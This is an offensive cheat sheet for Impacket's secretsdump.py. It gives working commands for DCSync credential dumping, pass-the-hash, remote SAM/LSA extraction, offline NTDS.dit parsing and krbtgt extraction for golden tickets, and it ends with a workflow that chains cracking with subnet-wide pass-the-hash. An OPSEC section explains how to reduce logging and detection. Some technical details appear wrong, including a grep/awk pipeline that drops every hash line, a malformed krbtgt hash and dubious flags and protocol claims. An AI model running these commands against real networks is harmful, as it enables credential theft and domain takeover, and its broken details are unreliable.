# <span style="color:rgb(255, 192, 0)">secretsdump.py - Impacket SecretsDump</span>

`secretsdump.py` from Impacket is the most versatile tool for extracting credentials from Windows systems. It supports remote extraction via DCSync, SAM/LSA dumping, and offline NTDS.dit parsing.

**Repository**: `https://github.com/fortra/impacket` | **Script**: `impacket/examples/secretsdump.py`

---

## <span style="color:rgb(255, 0, 0)">Installation</span>

```bash
# Via pip
pip install impacket

# From source
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```

---

## <span style="color:rgb(0, 176, 240)">1. DCSync Attacks (Remote, No Disk on Target)</span>

### Full DCSync — All Users
```bash
secretsdump.py contoso.local/Administrator:Passw0rd@DC01.contoso.local
```
- Extracts NTLM, AES128, AES256, LM hashes for all domain users
- Also dumps kerberos keys, cleartext passwords (if available)

### NTLM Hash Only
```bash
secretsdump.py -just-dc-ntlm contoso.local/Administrator:Passw0rd@DC01.contoso.local
```
- Only extracts NTLM hashes (faster, less bandwidth)

### Kerberos Keys Only
```bash
secretsdump.py -just-dc contoso.local/Administrator:Passw0rd@DC01.contoso.local
```
- Only extracts Kerberos keys (AES128, AES256) and NTLM
- No LM or cleartext

### Pass-the-Hash DCSync
```bash
secretsdump.py -hashes :NTLM_HASH contoso.local/Administrator@DC01.contoso.local
```
- Authenticate with NTLM hash instead of password

```bash
secretsdump.py -hashes LMHASH:NTLMHASH contoso.local/Administrator@DC01.contoso.local
```
- Full LM:NTLM hash pair

### Kerberos Authentication
```bash
export KRB5CCNAME=/path/to/admin.ccache
secretsdump.py -k -no-pass contoso.local/Administrator@DC01.contoso.local
```

### Specific DC IP
```bash
secretsdump.py -just-dc-ntlm contoso.local/Administrator:Passw0rd@DC01.contoso.local -dc-ip 10.10.10.5
```

---

## <span style="color:rgb(146, 208, 80)">2. Remote SAM/LSA Extraction</span>

### Remote SAM Dump
```bash
secretsdump.py contoso.local/Administrator:Passw0rd@TARGET_WORKSTATION
```
- Extracts local SAM hashes + cached domain credentials + LSA secrets
- Useful for lateral movement local admin hash reuse

### Remote SAM Without Admin Shares
```bash
secretsdump.py -sam SAM.save -system SYSTEM.save contoso.local/Administrator:Passw0rd@TARGET_WORKSTATION
```

---

## <span style="color:rgb(112, 48, 160)">3. Offline NTDS.dit Parsing</span>

### Basic Offline NTDS
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -local
```
- Parse a local copy of `ntds.dit` with the `SYSTEM` hive
- `-local` outputs local SAM-style format (for local admin hash cracking)

### With Security Hive
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY -local
```
- Also extracts cached domain credentials from the SECURITY hive

### Output Format (no local)
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM
```
- Full domain format with usernames and domain info

### Output to Files
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -outputfile dump
```
- Creates `dump.ntds`, `dump.sam`, `dump.cache`

---

## <span style="color:rgb(0, 32, 96)">4. Common Command Patterns</span>

### Domain User from Non-DC
```bash
secretsdump.py -just-dc-ntlm DOMAIN/user:pass@DC01
```

### Workstation Extraction
```bash
secretsdump.py -hashes :LOCAL_ADMIN_HASH WORKSTATION/user@10.0.0.50
```

### Export Target Hashes Only
```bash
secretsdump.py -just-dc-ntlm DOMAIN/Administrator:pass@DC01 | tee domain_hashes.txt
```

### Parse with History (Deleted Accounts)
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -history
```

### Execute with psexec-style
```bash
secretsdump.py DOMAIN/Administrator:Password@DC01 -exec-method smbexec
```
- Choose SMB method: `smbexec`, `wmiexec`, `mmcexec`

---

## <span style="color:rgb(94, 18, 18)">5. Output Interpretation</span>

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash:::)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aa6d3b435b51404eeaad3b435b51404ee:1c3a0a5c1b2b7f8d9e0f4a6b7c8d9e0f:::
user1:1104:aad3b435b51404eeaad3b435b51404ee:5c4a0a5c1b2b7f8d9e0f4a6b7c8d9e0f:::
```

**Format**: `username:RID:LM_HASH:NTLM_HASH:::`

LM hash `aad3b435b51404eeaad3b435b51404ee` = no LM hash stored.

---

## <span style="color:rgb(255, 255, 0)">6. OPSEC Notes</span>

| Consideration | Detail |
|---------------|--------|
| Network Traffic | DCSync uses LDAP/S (389/636); pattern is distinguishable from normal DC replication |
| Traffic Volume | DCSync (`/all`) transfers entire NTDS.dit over network — large volume |
| Authentication | Leaves logon events (4624) on target DC |
| Replication Events | 4662 with replication GUIDs is a strong signal |
| Target is DC IP | DCSync target must be a Domain Controller |
| AV/EDR | secretsdump.py is Python; less signatured than Mimikatz but still monitored |
| Rate Limiting | Too many replication requests may trigger account lockout or alerting |
| Output Size | Full domain dump can be hundreds of MBs for large orgs |

### Safer Approach
```bash
# DCSync only target user (less traffic, fewer logs)
secretsdump.py -just-dc-ntlm DOMAIN/user:pass@DC01 -user krbtgt
```

---

## <span style="color:rgb(146, 208, 80)">7. Troubleshooting</span>

| Error | Solution |
|-------|----------|
| `ERROR_DS_DRA_BAD_DN` | Check domain name spelling |
| `KDC_ERR_PADATA_TYPE_NOSUPP` | Use Kerberos auth with `-k` |
| `STATUS_LOGON_FAILURE` | Wrong credentials |
| `connect error` | DC not reachable on 445 or 389 |
| `This machine may be in a different domain` | Use FQDN for domain |
| `samba_krb5` errors | Unset KRB5CCNAME |

---

## <span style="color:rgb(0, 176, 240)">8. Full Workflow Example</span>

```bash
# Step 1: Get DA access
crackmapexec smb DC01.contoso.local -u Administrator -H NTLM_HASH

# Step 2: DCSync only NTLM hashes  
secretsdump.py -just-dc-ntlm contoso.local/Administrator@DC01 -hashes :NTLM_HASH

# Step 3: Extract krbtgt for golden ticket
secretsdump.py contoso.local/Administrator@DC01 -hashes :NTLM_HASH -user krbtgt

# Step 4: Parse hashes
cat output | grep -v ':' | awk -F ':' '{print $1 ":" $4}' > hash.txt

# Step 5: Crack (if needed)
hashcat -m 1000 hash.txt wordlist.txt

# Step 6: Pass-the-Hash
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH
```
